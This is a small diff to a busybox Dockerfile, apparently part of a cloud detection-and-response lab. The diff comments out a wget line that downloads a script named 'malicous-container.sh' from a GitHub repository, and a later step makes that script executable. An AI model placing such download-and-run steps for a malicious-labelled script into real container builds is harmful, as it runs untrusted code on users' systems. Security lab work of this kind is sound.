@@ -5,7 +5,7 @@ FROM busybox:latest
 WORKDIR /tmp/
 
 # Use wget (available in BusyBox) to download the script during runtime
-RUN wget -O /tmp/malicous-container.sh https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/alpha/1.0/malicous-container/malicous-container.sh
+# UPDATe RUN wget -O /tmp/malicous-container.sh https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/alpha/1.0/malicous-container/malicous-container.sh
 
 # Make the script executable
 RUN chmod +x /tmp/malicous-container.sh
